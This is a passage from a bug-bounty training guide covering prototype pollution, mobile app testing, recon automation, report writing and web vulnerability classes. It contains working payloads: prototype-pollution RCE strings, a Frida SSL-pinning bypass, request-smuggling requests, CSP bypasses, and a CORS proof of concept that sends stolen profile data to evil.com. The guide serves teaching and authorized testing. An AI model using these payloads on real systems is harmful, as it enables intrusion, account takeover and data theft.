    ctx.set_alpn_protocols(['h2'])
    
    sock = socket.create_connection((host, 443))
    sock = ctx.wrap_socket(sock, server_hostname=host)
    
    conn = h2.connection.H2Connection()
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    
    # Queue all requests without flushing
    for req in requests:
        stream_id = conn.get_next_available_stream_id()
        conn.send_headers(stream_id, req['headers'])
        conn.send_data(stream_id, req['body'], end_stream=True)
    
    # Send all at once — single packet
    sock.sendall(conn.data_to_send())
```

### 5.6 Prototype Pollution to XSS/RCE

```javascript
// Client-side prototype pollution detection:
// Test URL: https://target.com/page?__proto__[polluted]=true

// Check if pollution worked:
// In browser console: ({}).polluted === "true"

// Prototype pollution to XSS via common gadgets:

// Lodash template gadget:
?__proto__[sourceURL]='%0aalert(1)//

// jQuery gadget ($.extend deep merge):
$.extend(true, {}, JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}'))

// Server-side prototype pollution (Node.js) to RCE:
// If application uses child_process.spawn/exec with env:
{"__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require('child_process').execSync('id').toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}

// Detection via property injection:
POST /api/merge
{"__proto__": {"isAdmin": true}}

// Then check: GET /api/profile → "isAdmin": true?
```

---

## 6. Mobile and Thick Client Testing

### 6.1 Android APK Analysis

```bash
# Decompile APK
jadx -d output_dir target.apk

# Alternative: apktool for smali-level analysis
apktool d target.apk -o apktool_output

# Search decompiled source for secrets
grep -rn "api_key\|secret\|password\|token\|AWS_\|firebase" output_dir/
grep -rn "http://\|https://" output_dir/ | grep -v "schemas.android.com"

# Find hardcoded URLs and endpoints
grep -rhoP "https?://[^\"\s<>]+" output_dir/ | sort -u > endpoints.txt

# Check AndroidManifest.xml for:
# - Exported activities/services/receivers (android:exported="true")
# - Custom URL schemes (deep links)
# - Permissions
# - Debuggable flag (android:debuggable="true")
# - Backup allowed (android:allowBackup="true")
# - Network security config

# Frida — dynamic instrumentation
frida -U -f com.target.app -l bypass_ssl.js --no-pause

# SSL pinning bypass script (bypass_ssl.js):
# Use universal SSL pinning bypass scripts from:
# https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/

# objection — Frida-powered exploration
objection -g com.target.app explore

# Common objection commands:
# objection> android sslpinning disable
# objection> android root disable
# objection> android hooking list activities
# objection> android hooking list services
# objection> android intent launch_activity com.target.app/.AdminActivity
```

### 6.2 iOS Testing

```bash
# Class-dump (jailbroken device)
class-dump /var/containers/Bundle/Application/.../target.app/target > classes.h

# Frida on iOS
frida -U -f com.target.ios -l ios_hooks.js --no-pause

# iOS SSL pinning bypass:
# Using objection:
objection -g com.target.ios explore
# objection> ios sslpinning disable

# Using Frida script for iOS SSL bypass:
# Hooks NSURLSession, AFNetworking, Alamofire trust evaluation

# Keychain dump (jailbroken):
# objection> ios keychain dump

# Binary analysis with Hopper/Ghidra:
# Look for:
# - Hardcoded encryption keys
# - Certificate validation logic
# - Jailbreak detection (to bypass)
# - Debug logging endpoints

# IPA extraction and analysis:
# Use frida-ios-dump or ipatool
# Unzip .ipa and analyze Info.plist, embedded frameworks
unzip -q target.ipa -d ipa_contents
plutil -convert json ipa_contents/Payload/target.app/Info.plist
```

### 6.3 API Endpoint Extraction from Mobile Apps

```bash
# Automated extraction from APK:
apkleaks -f target.apk -o apk_leaks.txt

# MobSF (Mobile Security Framework) — automated analysis:
# Upload APK/IPA to MobSF for comprehensive static analysis
# Extracts: URLs, API keys, hardcoded secrets, permissions issues

# Runtime endpoint discovery via proxy:
# 1. Set up Burp/mitmproxy as proxy on device
# 2. Install Burp CA cert on device
# 3. Bypass SSL pinning (Frida/objection)
# 4. Use the app comprehensively
# 5. Export all captured endpoints

# mitmproxy automated capture:
mitmproxy --mode regular --listen-port 8080 \
  --set confdir=~/.mitmproxy \
  -w captured_traffic.flow

# Export endpoints from mitmproxy flow:
mitmdump -r captured_traffic.flow --set flow_detail=2 | \
  grep -oP "https?://[^\s]+" | sort -u
```

### 6.4 Certificate Pinning Bypass

```javascript
// Universal Android SSL Pinning Bypass (Frida script)
Java.perform(function() {
    // TrustManager bypass
    var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TrustManagerImpl.verifyChain.implementation = function() {
        return Java.use('java.util.ArrayList').$new();
    };

    // OkHttp3 CertificatePinner bypass
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List')
            .implementation = function(hostname, peerCertificates) {
                return; // Skip pin verification
            };
    } catch(e) {}

    // Custom WebViewClient bypass
    var WebViewClient = Java.use('android.webkit.WebViewClient');
    WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
        handler.proceed(); // Accept all certificates
    };
});
```

### 6.5 Deep Link Exploitation

```bash
# Extract deep links from AndroidManifest.xml:
grep -A5 "android.intent.action.VIEW" AndroidManifest.xml

# Common deep link vulnerabilities:
# 1. Deep link to WebView with JavaScript enabled:
#    app://open?url=javascript:alert(1)
#    app://open?url=https://evil.com
#
# 2. Deep link parameter injection:
#    app://transfer?to=attacker&amount=1000
#    (if deep link handler doesn't validate sender identity)
#
# 3. Deep link hijacking:
#    Register same scheme in malicious app
#    Android shows chooser or sends to wrong app

# Testing deep links via adb:
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://settings/admin" com.target.app

adb shell am start -a android.intent.action.VIEW \
  -d "https://target.com/app/redirect?to=https://evil.com"
```

### 6.6 Electron Application Vulnerabilities

```bash
# Extract Electron app (ASAR archive):
npx asar extract app.asar extracted_app/

# Common Electron vulnerabilities:
# 1. nodeIntegration: true in BrowserWindow
#    → XSS leads directly to RCE via require('child_process')
#
# 2. contextIsolation: false
#    → Renderer process can access Node.js APIs
#
# 3. Remote module enabled
#    → Cross-process object manipulation
#
# 4. Insecure protocol handlers
#    → Custom protocol:// schemes execute arbitrary code

# Check main.js for insecure configurations:
grep -n "nodeIntegration\|contextIsolation\|enableRemoteModule\|webSecurity" \
  extracted_app/main.js

# XSS to RCE in vulnerable Electron app:
# <img src=x onerror="require('child_process').exec('calc.exe')">

# If contextIsolation is false but nodeIntegration is false:
# Use preload script vulnerabilities to bridge the gap
```

---

## 7. Automation and Tooling

### 7.1 Custom Nuclei Templates

```yaml
# Custom nuclei template: detect exposed .env files
id: exposed-env-file

info:
  name: Exposed Environment File
  author: researcher
  severity: high
  description: Detects exposed .env files containing secrets
  tags: exposure,config

requests:
  - method: GET
    path:
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/.env.local"
      - "{{BaseURL}}/.env.production"
      - "{{BaseURL}}/.env.backup"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "DB_PASSWORD"
          - "APP_KEY"
          - "SECRET_KEY"
          - "API_KEY"
        condition: or

      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "text/plain"
          - "application/octet-stream"
        condition: or

    extractors:
      - type: regex
        regex:
          - "(DB_PASSWORD|APP_KEY|SECRET_KEY|AWS_SECRET)=.{1,100}"
```

```yaml
# Nuclei workflow: chain recon with exploitation
id: spring-actuator-chain

info:
  name: Spring Boot Actuator Exploitation Chain
  author: researcher
  severity: critical
  tags: spring,rce

requests:
  - method: GET
    path:
      - "{{BaseURL}}/actuator"
      - "{{BaseURL}}/actuator/env"
      - "{{BaseURL}}/actuator/heapdump"
      - "{{BaseURL}}/actuator/mappings"

    matchers:
      - type: word
        words:
          - "\"_links\""
          - "\"propertySources\""
        condition: or

    extractors:
      - type: json
        json:
          - ".propertySources[].properties | keys[]"
```

```yaml
# Template with matcher + extractor for IDOR detection
id: idor-user-profile

info:
  name: IDOR User Profile Access
  author: researcher
  severity: high
  tags: idor,auth

requests:
  - raw:
      - |
        GET /api/users/{{user_id}}/profile HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{attacker_token}}

    payloads:
      user_id: helpers/user_ids.txt

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "email"
          - "phone"
        condition: and
```

### 7.2 Building Recon Pipelines

```bash
#!/bin/bash
# recon_pipeline.sh — automated reconnaissance pipeline

TARGET="$1"
OUTPUT_DIR="./recon/$TARGET/$(date +%Y%m%d)"
mkdir -p "$OUTPUT_DIR"/{subs,dns,ports,web,js,params}

echo "[*] Starting recon for: $TARGET"

# Phase 1: Subdomain Enumeration (parallel)
echo "[*] Phase 1: Subdomain enumeration"
subfinder -d "$TARGET" -all -silent > "$OUTPUT_DIR/subs/subfinder.txt" &
amass enum -passive -d "$TARGET" -o "$OUTPUT_DIR/subs/amass.txt" &
assetfinder --subs-only "$TARGET" > "$OUTPUT_DIR/subs/assetfinder.txt" &
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | \
  jq -r '.[].name_value' 2>/dev/null | sort -u > "$OUTPUT_DIR/subs/crtsh.txt" &
wait

# Merge and deduplicate
cat "$OUTPUT_DIR/subs/"*.txt | sort -u > "$OUTPUT_DIR/subs/all_subs.txt"
echo "[+] Found $(wc -l < "$OUTPUT_DIR/subs/all_subs.txt") unique subdomains"

# Phase 2: DNS Resolution
echo "[*] Phase 2: DNS resolution"
puredns resolve "$OUTPUT_DIR/subs/all_subs.txt" \
  -r resolvers.txt \
  --wildcard-tests 5 \
  -w "$OUTPUT_DIR/dns/resolved.txt" 2>/dev/null

echo "[+] $(wc -l < "$OUTPUT_DIR/dns/resolved.txt") subdomains resolve"

# Phase 3: HTTP Probing
echo "[*] Phase 3: HTTP probing"
httpx -l "$OUTPUT_DIR/dns/resolved.txt" \
  -ports 80,443,8080,8443,3000,8000,9090 \
  -title -tech-detect -status-code \
  -follow-redirects \
  -silent \
  -o "$OUTPUT_DIR/web/live_hosts.txt"

echo "[+] $(wc -l < "$OUTPUT_DIR/web/live_hosts.txt") live web hosts"

# Phase 4: Technology Detection
echo "[*] Phase 4: Tech fingerprinting"
cat "$OUTPUT_DIR/web/live_hosts.txt" | awk '{print $1}' | \
  nuclei -tags tech -silent -o "$OUTPUT_DIR/web/tech.txt"

# Phase 5: Content Discovery (on top 50 hosts)
echo "[*] Phase 5: Content discovery"
head -50 "$OUTPUT_DIR/web/live_hosts.txt" | awk '{print $1}' | while read url; do
  domain=$(echo "$url" | unfurl domain)
  ffuf -u "${url}/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
    -mc 200,301,302,403 -fc 404 \
    -rate 50 -silent \
    -o "$OUTPUT_DIR/web/ffuf_${domain}.json" -of json 2>/dev/null
done

# Phase 6: JS File Analysis
echo "[*] Phase 6: JavaScript analysis"
cat "$OUTPUT_DIR/web/live_hosts.txt" | awk '{print $1}' | \
  hakrawler -js -depth 2 2>/dev/null | grep "\.js$" | sort -u > "$OUTPUT_DIR/js/js_files.txt"

while read jsurl; do
  python3 /opt/tools/LinkFinder/linkfinder.py -i "$jsurl" -o cli 2>/dev/null
done < "$OUTPUT_DIR/js/js_files.txt" | sort -u > "$OUTPUT_DIR/js/js_endpoints.txt"

# Phase 7: Historical URL mining
echo "[*] Phase 7: Wayback/GAU URLs"
echo "$TARGET" | gau --threads 5 2>/dev/null | sort -u > "$OUTPUT_DIR/params/gau_urls.txt"

# Extract parameters
cat "$OUTPUT_DIR/params/gau_urls.txt" | grep "?" | \
  unfurl --unique keys > "$OUTPUT_DIR/params/all_params.txt"

echo "[*] Recon complete. Results in: $OUTPUT_DIR"
echo "[*] Summary:"
echo "    Subdomains: $(wc -l < "$OUTPUT_DIR/subs/all_subs.txt")"
echo "    Live hosts: $(wc -l < "$OUTPUT_DIR/web/live_hosts.txt")"
echo "    JS files:   $(wc -l < "$OUTPUT_DIR/js/js_files.txt")"
echo "    Parameters: $(wc -l < "$OUTPUT_DIR/params/all_params.txt")"
```

### 7.3 Notification Systems

```bash
# notify — ProjectDiscovery notification tool
# Configure ~/.config/notify/provider-config.yaml:
# discord:
#   - id: "bounty-alerts"
#     discord_channel: "channel-id"
#     discord_username: "BugBot"
#     discord_webhook_url: "https://discord.com/api/webhooks/..."
#
# telegram:
#   - id: "bounty-telegram"
#     telegram_api_key: "bot-token"
#     telegram_chat_id: "chat-id"

# Send recon findings to notification channel
echo "New subdomain found: admin.target.com" | notify -silent

# Pipe nuclei findings directly to notifications:
nuclei -l live_hosts.txt -severity critical,high -silent | notify -silent

# Custom notification wrapper:
notify_finding() {
    local severity="$1"
    local message="$2"
    echo "[$severity] $(date +%Y-%m-%d_%H:%M) - $message" | notify -silent
}

# Integration in recon pipeline:
# When new subdomains are discovered:
comm -13 <(sort old_subs.txt) <(sort new_subs.txt) | while read sub; do
    notify_finding "INFO" "New subdomain: $sub"
done
```

### 7.4 Continuous Monitoring for New Assets

```bash
#!/bin/bash
# continuous_monitor.sh — run daily via cron

TARGETS_FILE="/opt/bounty/targets.txt"
DATA_DIR="/opt/bounty/data"

while read target; do
    PREV="$DATA_DIR/$target/previous_subs.txt"
    CURR="$DATA_DIR/$target/current_subs.txt"
    
    mkdir -p "$DATA_DIR/$target"
    
    # Move previous scan to comparison file
    [ -f "$CURR" ] && mv "$CURR" "$PREV"
    
    # Fresh enumeration
    subfinder -d "$target" -all -silent | sort -u > "$CURR"
    
    # Compare and alert on new subdomains
    if [ -f "$PREV" ]; then
        NEW_SUBS=$(comm -13 "$PREV" "$CURR")
        if [ -n "$NEW_SUBS" ]; then
            echo "$NEW_SUBS" | while read sub; do
                echo "[NEW] $target: $sub" | notify -silent
                # Auto-probe new subdomain
                echo "$sub" | httpx -silent -title -tech-detect | notify -silent
            done
        fi
    fi
done < "$TARGETS_FILE"

# Crontab entry (run daily at 03:00):
# 0 3 * * * /opt/bounty/continuous_monitor.sh >> /var/log/bounty_monitor.log 2>&1
```

### 7.5 Custom Wordlist Generation

```bash
# CeWL — scrape target for custom wordlist
cewl https://target.com -d 3 -m 5 -w target_cewl.txt

# Generate wordlist from JS files
cat js_endpoints.txt | unfurl paths | tr '/' '\n' | \
  sort -u | grep -v '^$' > js_paths_wordlist.txt

# Combine with SecLists for target-specific wordlist
cat target_cewl.txt js_paths_wordlist.txt \
    /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt | \
  sort -u > target_master_wordlist.txt

# Generate permutations for subdomain brute-forcing
# Common patterns: dev, staging, test, api, admin, internal, beta
cat << 'EOF' > prefixes.txt
dev
staging
stg
test
uat
api
admin
internal
beta
alpha
demo
sandbox
preprod
prod
EOF

# Generate: prefix.target.com and prefix-target variations
while read prefix; do
    echo "${prefix}.target.com"
    echo "${prefix}-target.com"
    echo "target-${prefix}.com"
done < prefixes.txt > brute_subs.txt
```

### 7.6 Burp Suite Extension Development

```python
# Burp Suite extension (Montoya API — modern Java/Kotlin approach)
# For Jython (legacy but widely used):

from burp import IBurpExtender, IHttpListener
import re

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("IDOR Detector")
        callbacks.registerHttpListener(self)
        print("[*] IDOR Detector loaded")

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            return

        response = messageInfo.getResponse()
        analyzedResponse = self._helpers.analyzeResponse(response)
        
        # Check if response contains other users' data
        request = messageInfo.getRequest()
        analyzedRequest = self._helpers.analyzeRequest(messageInfo)
        url = analyzedRequest.getUrl().toString()
        
        # Flag responses with numeric IDs in URL that return 200
        if re.search(r'/users/\d+|/api/v\d+/\w+/\d+', url):
            statusCode = analyzedResponse.getStatusCode()
            if statusCode == 200:
                # Highlight for manual review
                messageInfo.setHighlight("yellow")
                messageInfo.setComment("Potential IDOR - verify authorization")
```

---

## 8. Report Writing for Maximum Impact

### 8.1 Title Optimization

The title is the first thing triagers see. A good title communicates severity, location, and impact in one line.

**Good Titles:**

```
✓ "Account takeover via password reset token prediction on auth.target.com"
✓ "Stored XSS in comment field leads to admin session theft on app.target.com"
✓ "IDOR allows any user to download invoices of other organizations via /api/v2/invoices/{id}"
✓ "SSRF in PDF export feature exposes AWS metadata credentials"
✓ "Race condition in coupon redemption allows unlimited discount application"
```

**Bad Titles:**

```
✗ "XSS found"
✗ "Security issue in your application"
✗ "Critical vulnerability"
✗ "Bug in API"
✗ "I found something interesting"
```

### 8.2 Report Structure

```markdown
## Title
[Concise, descriptive, includes asset and impact]

## Summary
[2-3 sentences: what the vulnerability is, where it exists, what an attacker gains]

## Severity
[Critical/High/Medium/Low with CVSS 3.1 score and vector string]
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N — Score: 8.1 (High)

## Affected Asset
[Exact URL, endpoint, parameter, or component]

## Steps to Reproduce
1. Navigate to https://target.com/api/v2/users
2. Authenticate as user A (attacker account)
3. Send the following request:
   ```http
   GET /api/v2/users/VICTIM_ID/documents HTTP/1.1
   Host: target.com
   Authorization: Bearer ATTACKER_TOKEN
   ```
4. Observe that victim's documents are returned in the response

## Proof of Concept
[Screenshot, video, or curl command demonstrating the issue]

## Impact
[Real-world consequence: data breach, financial loss, account compromise]
An attacker can access any user's private documents by iterating through
user IDs. With 50,000 users on the platform, this exposes all private
files including tax documents and identity verification uploads.

## Remediation Recommendation
[Specific, actionable fix]
Implement authorization checks in the /api/v2/users/{id}/documents endpoint
to verify that the requesting user owns the requested resources. Return 403
for unauthorized access attempts.

## References
- CWE-639: Authorization Bypass Through User-Controlled Key
- OWASP API Security Top 10: API1 - Broken Object Level Authorization
```

### 8.3 Impact Demonstration

Triagers discount theoretical attacks. Demonstrate real impact:

```
WEAK: "An attacker could potentially access other users' data"

STRONG: "I accessed 5 other test accounts' private documents (screenshots 
attached). The endpoint returns full PII including email, phone, SSN for 
any user ID. With the enumeration endpoint at /api/users (which returns 
all user IDs), an attacker can mass-harvest all 50,000 users' PII in 
approximately 8 minutes at the current rate limit of 100 req/sec."
```

**Quantify impact:**
- Number of affected users
- Type of data exposed (PII, financial, health records)
- Estimated exploitation time
- Effort required (automated vs manual)
- Financial impact if applicable

### 8.4 CVSS Scoring Justification

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N = 8.1 (High)

Justification:
- Attack Vector (AV:N): Exploitable over the internet
- Attack Complexity (AC:L): No special conditions needed
- Privileges Required (PR:L): Requires basic authenticated account
- User Interaction (UI:N): No victim interaction needed
- Scope (S:U): Impact limited to the vulnerable component
- Confidentiality (C:H): Full access to other users' private data
- Integrity (I:H): Can modify other users' data
- Availability (A:N): No availability impact
```

### 8.5 Video PoCs

When to include video PoCs:

- Complex multi-step exploitation chains
- Race conditions (timing-dependent)
- Business logic flaws (context-dependent flow)
- Mobile application testing
- When screenshots alone cannot capture the full attack flow

**Video PoC Best Practices:**

```
1. Keep it under 3 minutes
2. Show the full chain from start to finish
3. Include narration or text annotations
4. Show the before/after state clearly
5. Use browser DevTools to highlight the vulnerability
6. Record at 1080p minimum
7. Use OBS Studio or asciinema for terminal recordings
```

### 8.6 Handling Disputes and Mediation

**Common Dispute Scenarios:**

1. **Duplicate claim:** Provide timestamps, unique details in your finding
2. **Severity downgrade:** Present CVSS justification, real-world impact scenarios
3. **Not reproducible:** Offer to provide additional steps, video, or live demo
4. **Out of scope:** Reference exact policy language, show how it fits within scope
5. **Informational close:** Demonstrate the chain to higher impact

**Professional Communication:**

```
DO:
- Remain professional and data-driven
- Reference specific policy sections
- Provide additional evidence when requested
- Acknowledge the security team's perspective
- Request mediation through the platform if stuck

DON'T:
- Threaten public disclosure
- Become hostile or condescending
- Spam the report with follow-up messages
- Dispute every single decision
- Compare your report to others publicly
```

**Mediation Process:**

Most platforms offer mediation when researcher and program disagree. The process typically involves:

1. Researcher requests mediation via platform support
2. Platform assigns a neutral security expert
3. Expert reviews the report, reproduction steps, and both parties' arguments
4. Expert makes a binding decision on validity and severity
5. Resolution typically takes 7-14 business days

---

## 9. Vulnerability Classes Deep Dive

### 9.1 Account Takeover Vectors

**Password Reset Exploitation:**

```bash
# Token prediction:
# Some apps use sequential/time-based reset tokens
# Request multiple resets, analyze token pattern:
# Token1: a1b2c3d4-1234-0001
# Token2: a1b2c3d5-1234-0002
# → Predictable increment

# Host header injection:
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
# If the app uses Host header to build reset URL:
# victim receives: https://evil.com/reset?token=VALID_TOKEN

# Alternative host header attacks:
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com

# Token reuse — check if tokens are invalidated after use
# Use token once, then try again → should fail
# Request new token, check if old token still works

# Timing-based token brute-force:
# 4-6 digit OTP codes → 10,000-1,000,000 possibilities
# If rate limiting is bypassed, brute-force is feasible
```

**Email Change ATO:**

```
1. Change email to attacker-controlled address
2. If no confirmation required on OLD email → immediate ATO
3. If confirmation sent to new email only → ATO
4. Check if email change invalidates existing sessions
5. Check if email change triggers password reset capability
```

**Session Fixation:**

```http
# Force victim to use attacker's session ID:
# 1. Attacker gets valid session from target site
# 2. Attacker tricks victim into using that session:
#    https://target.com/login?session_id=ATTACKER_SESSION
# 3. Victim authenticates, session is now authenticated
# 4. Attacker uses same session ID → logged in as victim

# Check if session ID changes after authentication (it should)
# Check if session accepts IDs from URL parameters
# Check if session accepts IDs from custom headers
```

### 9.2 Subdomain Takeover

A subdomain takeover occurs when a DNS record (typically CNAME) points to a service that no longer exists, allowing an attacker to claim that service and serve content on the subdomain.

```bash
# Detection tools:
# subjack — checks for takeover conditions
subjack -w resolved.txt -t 100 -timeout 30 -ssl -c fingerprints.json -v

# nuclei takeover templates
nuclei -l resolved.txt -tags takeover -o takeovers.txt

# can-i-take-over-xyz — community maintained list
# Reference: https://github.com/EdOverflow/can-i-take-over-xyz

# Manual CNAME check:
dig CNAME dev.target.com +short
# Returns: target-dev.herokuapp.com
# If that Heroku app doesn't exist → takeover possible

# Common vulnerable services:
# - GitHub Pages (404 on CNAME)
# - Heroku (No such app)
# - AWS S3 (NoSuchBucket)
# - Shopify (Sorry, this shop is unavailable)
# - Azure (NXDOMAIN on *.azurewebsites.net)
# - Fastly (Fastly error: unknown domain)
# - Pantheon (404 - unknown site)
# - Tumblr (There's nothing here)
# - WordPress.com (doesn't exist)

# NS takeover (more severe):
# If NS records point to expired/available domain
# Attacker registers the NS domain → controls ALL DNS for the subdomain
dig NS target.com
# Check if each NS domain is still registered
whois ns1.expired-provider.com
```

### 9.3 Cache Poisoning and Web Cache Deception

**Cache Poisoning:**

```bash
# Identify cached responses:
# Look for: X-Cache: HIT, Age: 123, CF-Cache-Status: HIT

# Unkeyed header injection:
# Cache keys typically include: Host, Path, Query params
# Unkeyed inputs (not part of cache key) that affect response:
# X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL

GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# If response reflects evil.com and is cached:
# All subsequent visitors see the poisoned response

# Tools:
# param-miner (Burp extension) — discovers unkeyed parameters and headers
# Web Cache Vulnerability Scanner — automated detection
```

**Web Cache Deception:**

```bash
# Trick cache into storing authenticated content:
# 1. Victim visits: https://target.com/account/settings/nonexist.css
# 2. Server processes /account/settings (ignores .css — path normalization)
# 3. Server returns authenticated account page
# 4. Cache sees .css extension → caches the response as static content
# 5. Attacker visits same URL → gets victim's cached account page

# Payloads:
https://target.com/my-account/anything.js
https://target.com/my-account/anything.css
https://target.com/my-account/anything.jpg
https://target.com/my-account%2f..%2fstatic/x.css
https://target.com/api/user/profile/..;/static/x.js

# Detection:
# 1. Log in as victim
# 2. Visit: /account/settings/test123.css
# 3. Log out (or use different browser)
# 4. Visit same URL unauthenticated
# 5. If victim's authenticated content appears → WCD vulnerability
```

### 9.4 HTTP Request Smuggling

Request smuggling exploits disagreements between front-end (proxy/CDN) and back-end servers on where one HTTP request ends and the next begins.

```bash
# CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding):
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL (front-end uses Transfer-Encoding, back-end uses Content-Length):
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


# TE.TE (both use TE but one can be confused with obfuscation):
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: x

# Obfuscation techniques:
Transfer-Encoding : chunked
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-encoding: chunked
Transfer-Encoding:chunked

# H2.CL (HTTP/2 front-end, HTTP/1.1 back-end):
# HTTP/2 doesn't use Content-Length for framing
# But downgrade to HTTP/1.1 reintroduces it
# Inject Content-Length header in HTTP/2 request
# Back-end uses injected CL → smuggling

# Detection with smuggler.py:
python3 smuggler.py -u https://target.com

# Detection methodology:
# 1. Send timing-based detection request
# 2. If response is delayed → potential smuggling
# 3. Confirm with differential response
# 4. Exploit: hijack other users' requests, poison cache, bypass auth
```

### 9.5 CORS Misconfiguration Exploitation

```bash
# Test CORS configuration:
curl -s -I https://target.com/api/user \
  -H "Origin: https://evil.com" | grep -i "access-control"

# Vulnerable responses:
# Access-Control-Allow-Origin: https://evil.com  ← reflects attacker origin
# Access-Control-Allow-Credentials: true          ← allows cookies

# Common CORS misconfigurations:

# 1. Reflected origin (most dangerous):
Origin: https://evil.com → ACAO: https://evil.com + credentials: true

# 2. Null origin accepted:
Origin: null → ACAO: null + credentials: true
# Exploitable via sandboxed iframe: <iframe sandbox="allow-scripts">

# 3. Subdomain wildcard without validation:
Origin: https://evil.target.com → ACAO: https://evil.target.com
# If attacker controls any subdomain → full access

# 4. Prefix/suffix bypass:
Origin: https://target.com.evil.com → ACAO: https://target.com.evil.com
Origin: https://evilstarget.com → might pass regex check

# Exploitation PoC (steal data via CORS):
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/user/profile', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Exfiltrate to attacker server
    fetch('https://evil.com/steal', {
        method: 'POST',
        body: xhr.responseText
    });
};
xhr.send();
</script>
```

### 9.6 CSP Bypass Techniques

```bash
# Common CSP bypass vectors:

# 1. If script-src includes 'unsafe-eval':
# Use eval-based payloads
<script>eval('alert(1)')</script>

# 2. If script-src allows a CDN (e.g., cdnjs.cloudflare.com):
# Find libraries on that CDN with useful gadgets:
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

# 3. If script-src includes 'self' with file upload:
# Upload JS file, reference it in XSS payload

# 4. Base-uri missing in CSP:
<base href="https://evil.com/">
# All relative script srcs now load from evil.com

# 5. JSONP endpoints on allowed origins:
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>

# 6. If object-src not restricted:
<object data="data:text/html,<script>alert(1)</script>">

# 7. Via DNS prefetch (data exfiltration even without script execution):
<link rel="dns-prefetch" href="//data.evil.com">

# 8. If script-src 'nonce-VALUE' but the nonce is predictable or leaked

# CSP evaluation tool:
# https://csp-evaluator.withgoogle.com/
# Paste the CSP header and get bypass suggestions
```

### 9.7 Additional Vulnerability Classes

**DOM Clobbering:**

```html
<!-- Override JavaScript variables via DOM elements -->
<form id="x"><input name="y" value="evil"></form>
<!-- Now document.x.y.value === "evil" -->

<!-- If code does: if (window.config) { url = window.config.url } -->
<a id="config" href="javascript:alert(1)"></a>
<!-- Or: -->
<form id="config"><input name="url" value="https://evil.com/payload.js"></form>
```

**Dangling Markup Injection:**

```html
<!-- When XSS is partially filtered but HTML injection exists -->
<!-- Inject unclosed tag to capture subsequent page content: -->
<img src="https://evil.com/collect?data=
<!-- Everything until the next quote becomes part of the src URL -->
<!-- Exfiltrates CSRF tokens, session data from page source -->
```

---

## 10. Lab Exercises

### Exercise 1: Build a Full Recon Pipeline

**Objective:** Create an automated reconnaissance pipeline that discovers assets, resolves live hosts, fingerprints technologies, and outputs a prioritized target list.

**Requirements:**

```bash
# Your pipeline must:
# 1. Accept a root domain as input
# 2. Enumerate subdomains from at least 4 sources
# 3. Resolve DNS and filter to live hosts
# 4. Probe HTTP services on common ports
# 5. Fingerprint technology stacks
# 6. Discover content/endpoints on live hosts
# 7. Mine historical URLs for parameters
# 8. Output a structured report

# Skeleton:
#!/bin/bash
set -euo pipefail

TARGET="${1:?Usage: $0 <domain>}"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTDIR="./recon_${TARGET}_${TIMESTAMP}"
RESOLVERS="/opt/tools/resolvers.txt"

mkdir -p "$OUTDIR"/{01_subdomains,02_resolved,03_live,04_tech,05_content,06_historical}

# Task 1: Subdomain enumeration
# Use: subfinder, amass passive, assetfinder, crt.sh
# Merge results into 01_subdomains/all.txt

# Task 2: DNS resolution with wildcard filtering
# Use: puredns or massdns
# Output: 02_resolved/resolved.txt

# Task 3: HTTP probing
# Use: httpx with tech-detect, status codes, titles
# Output: 03_live/live_hosts.txt

# Task 4: Technology fingerprinting
# Use: nuclei tech templates or webanalyze
# Output: 04_tech/technologies.json

# Task 5: Targeted content discovery
# Use: ffuf with appropriate wordlists per technology
# Example: WordPress targets get wp-specific wordlist
# Output: 05_content/discoveries.txt

# Task 6: Historical URL mining
# Use: gau, waybackurls
# Extract: parameters, endpoints, file types
# Output: 06_historical/urls.txt, params.txt

# Task 7: Generate prioritized target report
# Priority scoring:
# - Staging/dev environments → +3
# - Admin panels → +3
# - API endpoints → +2
# - Known vulnerable tech → +2
# - File upload functionality → +2
# - Authentication pages → +1

# Deliverable: structured JSON with host, tech, priority_score, and notes
```

**Evaluation Criteria:**

- Pipeline runs end-to-end without manual intervention
- Handles errors gracefully (tool failures do not halt pipeline)
